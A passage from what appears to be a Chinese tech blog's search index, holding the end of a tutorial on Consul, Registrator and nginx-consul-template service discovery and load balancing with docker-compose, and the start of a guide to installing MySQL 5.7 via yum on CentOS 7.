class="string">"/var/run/docker.sock:/tmp/docker.sock"</span></span><br><span class="line"><span class="attr">    command:</span>  <span class="bullet">-ip</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.182</span> <span class="attr">consul://192.168.1.182:8500</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_server_1:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-server:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=test-server-http-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-server-http-service-01</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/health</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_NAME=test-server-thrift-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_TAGS=test-server-thrift-service-01</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TCP=/</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"16000:8080"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"30000:25000"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_server_2:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-server:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=test-server-http-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-server-http-service-02</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/health</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_NAME=test-server-thrift-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_TAGS=test-server-thrift-service-02</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TCP=/</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"18000:8080"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"32000:25000"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_client_1:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-client:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=my-web-server</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-client-http-service-01</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/features</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80:8080"</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>主机：192.168.1.183</strong></li>
</ul>
<p>docker-compose.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  consul_client_02:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">consul:latest</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8300:8300"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8301:8301"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8301:8301/udp"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8302:8302"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8302:8302/udp"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8400:8400"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8500:8500"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8600:8600"</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">consul</span> <span class="string">agent</span> <span class="bullet">-retry-join</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span> <span class="bullet">-advertise</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.183</span> <span class="bullet">-node</span> <span class="string">consul_client_02</span> <span class="bullet">-data-dir</span> <span class="string">/tmp/data-dir</span> <span class="bullet">-client</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="bullet">-ui</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  registrator:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">gliderlabs/registrator:latest</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"/var/run/docker.sock:/tmp/docker.sock"</span></span><br><span class="line"><span class="attr">    command:</span>  <span class="bullet">-ip</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.183</span> <span class="attr">consul://192.168.1.183:8500</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_server_1:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-server:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=test-server-http-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-server-http-service-03</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/health</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_NAME=test-server-thrift-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_TAGS=test-server-thrift-service-03</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TCP=/</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"16000:8080"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"30000:25000"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_server_2:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-server:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=test-server-http-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-server-http-service-04</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/health</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_NAME=test-server-thrift-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_TAGS=test-server-thrift-service-04</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TCP=/</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"18000:8080"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"32000:25000"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_client_1:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-client:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=my-web-server</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-client-http-service-02</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/features</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80:8080"</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>主机：192.168.1.185</strong></li>
</ul>
<p>docker-compose.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  consul_client_03:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">consul:latest</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8300:8300"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8301:8301"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8301:8301/udp"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8302:8302"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8302:8302/udp"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8400:8400"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8500:8500"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"8600:8600"</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">consul</span> <span class="string">agent</span> <span class="bullet">-retry-join</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span> <span class="bullet">-advertise</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.185</span> <span class="bullet">-node</span> <span class="string">consul_client_03</span> <span class="bullet">-data-dir</span> <span class="string">/tmp/data-dir</span> <span class="bullet">-client</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="bullet">-ui</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  registrator:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">gliderlabs/registrator:latest</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"/var/run/docker.sock:/tmp/docker.sock"</span></span><br><span class="line"><span class="attr">    command:</span>  <span class="bullet">-ip</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.185</span> <span class="attr">consul://192.168.1.185:8500</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_server_1:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-server:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=test-server-http-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-server-http-service-05</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/health</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_NAME=test-server-thrift-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_TAGS=test-server-thrift-service-05</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TCP=/</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"16000:8080"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"30000:25000"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_server_2:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-server:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=test-server-http-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-server-http-service-06</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/health</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_NAME=test-server-thrift-service</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_TAGS=test-server-thrift-service-06</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_25000_CHECK_TCP=/</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"18000:8080"</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"32000:25000"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  test_client_1:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">test-client:latest</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_NAME=my-web-server</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_TAGS=test-client-http-service-03</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_INTERVAL=10s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_TIMEOUT=2s</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">SERVICE_8080_CHECK_HTTP=/features</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80:8080"</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong>我们使用的第三方镜像 <code>liberalman/nginx-consul-template</code>，<code>Nginx</code> 会把名称为 <code>my-web-server</code>的<strong>服务容器</strong>作为后台转发的<strong>目标服务器</strong>，因此，在 <code>test-client</code> 的配置项中，需要指定 <code>SERVICE_XXX_NAME</code> 为 <code>my-web-server</code>。当然你也可以自己<strong>制作镜像</strong>指定<strong>模板</strong>。</p>
</blockquote>
<p>(b). 在三台主机上使用 <code>docker-compose</code> 启动多容器应用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>以主机 <code>192.168.1.182</code> 为例 (其余两台类似)，控制台日志显示，创建并启动 <code>docker-compose.yml</code> 文件配置的5个<strong>容器实例</strong>。</p>
<p><img src="/articles/5ab1727a/10.png" alt></p>
<p>(c). 查看正常启动的容器进程，观察到 <code>Consul</code>、一台<code>test-client</code> 和 两台<code>test-server</code>的容器都正常启动。</p>
<p><img src="/articles/5ab1727a/11.png" alt></p>
<p>(d). 在 <code>b</code> 操作中的控制台输出可以看到：<code>docker-compose</code> 并非按照 <code>docker-compose.yml</code> 文件中服务配置的<strong>先后顺序</strong>启动。 <code>registrator</code> 容器的启动依赖于 <code>consul</code> 容器，而此时 <code>consul</code> 还并未启动，就出现了 <code>registrator</code> 优先启动而<strong>异常退出</strong>的现象。解决方法是再运行一次 <code>docker-compose up -d</code> 命令。</p>
<p><img src="/articles/5ab1727a/12.png" alt></p>
<p>(e). 再次查看容器进程，此时 <code>Registrator</code> 容器就已经正常启动了。</p>
<p><img src="/articles/5ab1727a/13.png" alt></p>
<p>(f). 以相同的方式在其余两台主机上<strong>重复</strong>以上操作，再次访问 <code>http://IP:8500</code> 查看 <code>Consul Server</code> 的<strong>节点信息</strong>和<strong>服务注册列表</strong>。</p>
<ul>
<li><p><code>Consul</code> 集群节点信息，包括两台 <code>Consul Server</code> 节点和一台 <code>Consul Client</code> 节点，节点右侧可以看到所有的<strong>服务注册列表</strong>和相关的<strong>健康检查结果</strong>：</p>
</li>
<li><p><code>nginx</code> 服务状态列表，服务名称 <code>nginx-consul-template</code>，提供 <code>http</code> 服务，共有2个服务实例：</p>
</li>
</ul>
<p><img src="/articles/5ab1727a/14.png" alt></p>
<ul>
<li><code>test-client</code> 服务状态列表，服务名称为 <code>my-web-server</code>，提供 <code>http</code> 服务，共有3个服务实例：</li>
</ul>
<p><img src="/articles/5ab1727a/15.png" alt></p>
<ul>
<li><code>test-server</code> 服务状态列表，服务名称为 <code>test-server-http-service</code> 和 <code>test-server-thrift-service</code>，分别对应6个 <code>http</code> 服务实例和 6个 <code>thrift</code> 服务实例：</li>
</ul>
<p><img src="/articles/5ab1727a/16.png" alt></p>
<p><img src="/articles/5ab1727a/17.png" alt></p>
<p>三台  <code>Consul Client</code> 主机上的容器服务实例均正常启动，服务注册和发现运行正常！</p>
<h2 id="结果验证"><a href="#结果验证" class="headerlink" title="结果验证"></a>结果验证</h2><h4 id="Nginx负载均衡"><a href="#Nginx负载均衡" class="headerlink" title="Nginx负载均衡"></a>Nginx负载均衡</h4><h5 id="访问Nginx"><a href="#访问Nginx" class="headerlink" title="访问Nginx"></a>访问Nginx</h5><p><code>Nginx</code> 默认访问端口号为<code>80</code>，任选一台 <code>Nginx</code> 访问，比如： <code>http://192.168.1.181/swagger-ui.html</code>。</p>
<p><img src="/articles/5ab1727a/18.png" alt></p>
<p>请求转发至 <code>Test Client</code> 的 <code>Swagger</code>页面，表明 <code>nginx</code>配置文件 <code>nginx.conf</code> 被 <code>Consul-template</code> 成功修改。</p>
<h5 id="进入Nginx容器"><a href="#进入Nginx容器" class="headerlink" title="进入Nginx容器"></a>进入Nginx容器</h5><p>运行 <code>docker ps</code> 查看 <code>nginx-consul-template</code> 的容器 <code>ID</code>，比如这里是：<code>4f2731a7e0cb</code>。进入 <code>nginx-consul-template</code> 容器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-enter 4f2731a7e0cb</span><br></pre></td></tr></table></figure>

<p>查看容器内部的进程列表：</p>
<p><img src="/articles/5ab1727a/19.png" alt></p>
<p>特别留意以下一行进程命令，这里完成了三步重要的操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">consul-template -consul-addr=consul:8500 -template /etc/consul-templates/nginx.conf.ctmpl:/etc/nginx/conf.d/app.conf:nginx -s reload</span><br></pre></td></tr></table></figure>

<ol>
<li><code>Consul-template</code> 利用 <code>Consul</code> 上的<strong>服务信息</strong>对 <code>Nginx</code> 的<strong>配置文件模板</strong> <code>/etc/consul-templates/nginx.conf.ctmpl</code> 进行重新<strong>解析</strong>和<strong>渲染</strong>。</li>
<li><strong>渲染</strong>生成的 <code>nginx</code> 配置文件为 <code>/etc/nginx/conf.d/app.conf</code>。</li>
<li>进一步运行 <code>nginx -s reload</code> 重新加载 <code>app.conf</code>，更新<strong>路由转发列表</strong>。</li>
</ol>
<p>查看 <code>app.conf</code> 的配置项，发现三个 <code>test-client</code> 节点的 <code>IP:port</code> 都加入了<strong>路由转发列表</strong>中。</p>
<p><img src="/articles/5ab1727a/20.png" alt></p>
<p>退出并关闭主机 <code>192.168.1.182</code> 上的 <code>test-client</code> 容器。</p>
<p><img src="/articles/5ab1727a/21.png" alt></p>
<p>再次查看 <code>app.conf</code>，可以发现<strong>路由节点</strong> <code>192.168.1.182:80</code> 已经从 <code>Nginx</code> 的<strong>路由转发列表</strong>上<strong>剔除</strong>掉了。</p>
<p><img src="/articles/5ab1727a/22.png" alt></p>
<p>同样的，重新启动 <code>test-client</code> 恢复容器，又可以发现 <code>Nginx</code> 的<strong>路由转发列表</strong> 再次自动将其添加!</p>
<h4 id="服务负载均衡"><a href="#服务负载均衡" class="headerlink" title="服务负载均衡"></a>服务负载均衡</h4><h5 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h5><p><code>test-client</code> 通过 <code>http</code> 通信方式请求任意一台 <code>test-server</code>，返回响应结果 (请求处理时间 <code>ms</code> )。</p>
<p><img src="/articles/5ab1727a/23.png" alt></p>
<p><code>test-client</code> 通过 <code>thrift</code> 通信方式请求任意一台 <code>test-server</code>，返回响应结果 (请求处理时间 <code>ms</code> )。</p>
<p><img src="/articles/5ab1727a/24.png" alt></p>
<h5 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h5><p><strong>服务的负载均衡</strong>并不是很好观察，这里直接截取了一段 <code>test-client</code> 的<strong>服务缓存列表</strong>动态定时刷新时打印的日志：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2018-02-09 13:15:55.157  INFO 1 --- [erListUpdater-1] t.c.l.ThriftConsulServerListLoadBalancer : Refreshed thrift serverList: [</span><br><span class="line">test-server-thrift-service: [</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_01', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-01], host='192.168.1.182', port=30000, address='192.168.1.182', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_01', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-02], host='192.168.1.182', port=32000, address='192.168.1.182', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_02', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-03], host='192.168.1.183', port=30000, address='192.168.1.183', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_02', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-04], host='192.168.1.183', port=32000, address='192.168.1.183', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_03', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-05], host='192.168.1.185', port=30000, address='192.168.1.185', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_03', serviceId='test-server-thrift-service', tags=[test-server-thrift-service-06], host='192.168.1.185', port=32000, address='192.168.1.185', isHealth=true&#125;</span><br><span class="line">],</span><br><span class="line">test-server-http-service: [</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_01', serviceId='test-server-http-service', tags=[test-server-http-service-01], host='192.168.1.182', port=16000, address='192.168.1.182', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_01', serviceId='test-server-http-service', tags=[test-server-http-service-02], host='192.168.1.182', port=18000, address='192.168.1.182', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_02', serviceId='test-server-http-service', tags=[test-server-http-service-03], host='192.168.1.183', port=16000, address='192.168.1.183', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_02', serviceId='test-server-http-service', tags=[test-server-http-service-04], host='192.168.1.183', port=18000, address='192.168.1.183', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_03', serviceId='test-server-http-service', tags=[test-server-http-service-05], host='192.168.1.185', port=16000, address='192.168.1.185', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_03', serviceId='test-server-http-service', tags=[test-server-http-service-06], host='192.168.1.185', port=18000, address='192.168.1.185', isHealth=true&#125;</span><br><span class="line">],</span><br><span class="line">my-web-server: [</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_01', serviceId='my-web-server', tags=[test-client-http-service-01], host='192.168.1.182', port=80, address='192.168.1.182', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_02', serviceId='my-web-server', tags=[test-client-http-service-02], host='192.168.1.183', port=80, address='192.168.1.183', isHealth=true&#125;,</span><br><span class="line">    ThriftServerNode&#123;node='consul_client_03', serviceId='my-web-server', tags=[test-client-http-service-03], host='192.168.1.185', port=80, address='192.168.1.185', isHealth=true&#125;</span><br><span class="line">]]</span><br></pre></td></tr></table></figure>

<h4 id="服务实例"><a href="#服务实例" class="headerlink" title="服务实例"></a>服务实例</h4><ul>
<li><code>test-server-http-service</code> 所有<strong>健康</strong>的服务实例：</li>
</ul>
<table>
<thead>
<tr>
<th>服务IP地址</th>
<th>服务端口</th>
<th>服务标签</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.1.182</td>
<td>16000</td>
<td>test-server-http-service-01</td>
</tr>
<tr>
<td>192.168.1.182</td>
<td>18000</td>
<td>test-server-http-service-02</td>
</tr>
<tr>
<td>192.168.1.183</td>
<td>16000</td>
<td>test-server-http-service-03</td>
</tr>
<tr>
<td>192.168.1.183</td>
<td>18000</td>
<td>test-server-http-service-04</td>
</tr>
<tr>
<td>192.168.1.185</td>
<td>16000</td>
<td>test-server-http-service-05</td>
</tr>
<tr>
<td>192.168.1.185</td>
<td>18000</td>
<td>test-server-http-service-06</td>
</tr>
</tbody></table>
<ul>
<li><code>test-server-thrift-service</code> 所有<strong>健康</strong>的服务实例：</li>
</ul>
<table>
<thead>
<tr>
<th>服务IP地址</th>
<th>服务端口</th>
<th>服务标签</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.1.182</td>
<td>30000</td>
<td>test-server-thrift-service-01</td>
</tr>
<tr>
<td>192.168.1.182</td>
<td>32000</td>
<td>test-server-thrift-service-02</td>
</tr>
<tr>
<td>192.168.1.183</td>
<td>30000</td>
<td>test-server-thrift-service-03</td>
</tr>
<tr>
<td>192.168.1.183</td>
<td>32000</td>
<td>test-server-thrift-service-04</td>
</tr>
<tr>
<td>192.168.1.185</td>
<td>30000</td>
<td>test-server-thrift-service-05</td>
</tr>
<tr>
<td>192.168.1.185</td>
<td>32000</td>
<td>test-server-thrift-service-06</td>
</tr>
</tbody></table>
<ul>
<li><code>my-web-server</code> 所有<strong>健康</strong>的服务实例：</li>
</ul>
<table>
<thead>
<tr>
<th>服务IP地址</th>
<th>服务端口</th>
<th>服务标签</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.1.182</td>
<td>80</td>
<td>test-client-http-service-01</td>
</tr>
<tr>
<td>192.168.1.183</td>
<td>80</td>
<td>test-client-http-service-02</td>
</tr>
<tr>
<td>192.168.1.185</td>
<td>80</td>
<td>test-client-http-service-03</td>
</tr>
</tbody></table>
<p><code>spring-cloud-starter-thrift</code> 采用的<strong>轮询</strong>的转发策略，也就是说 <code>my-web-server</code> 会按<strong>次序循环往来</strong>地将 <code>http</code> 或者 <code>rpc</code> 请求分发到各自的 <code>6</code> 个<strong>服务实例</strong>完成处理。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文提供了一套基于<strong>微服务服务注册与发现体系</strong>和<strong>容器</strong>的<strong>高可用</strong> (<code>HA</code>) 解决方案，引入了<strong>接入层</strong>和<strong>服务层</strong>的<strong>自动负载均衡</strong>的实现，详细给出了<strong>实践方案</strong>和<strong>技术手段</strong></p>
]]></content>
      <categories>
        <category>Web服务</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql之yum安装</title>
    <url>/articles/db063ff7.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>在CentOS7中默认安装有MariaDB，这个是MySQL的分支，但为了需要，还是要在系统中安装MySQL，而且安装完成之后可以直接覆盖掉MariaDB，本文yum一键安装mysql数据库。</p>
<a id="more"></a>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h4 id="下载官方的Yum源"><a href="#下载官方的Yum源" class="headerlink" title="下载官方的Yum源"></a>下载官方的Yum源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@BrianZhu /]``# wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm`</span><br></pre></td></tr></table></figure>

<p>使用上面的命令就直接下载了安装用的Yum Repository，大概25KB的样子。</p>
<h4 id="安装Yum源"><a href="#安装Yum源" class="headerlink" title="安装Yum源"></a>安装Yum源</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@BrianZhu /]``# yum -y install mysql57-community-release-el7-10.noarch.rpm`</span><br></pre></td></tr></table></figure>

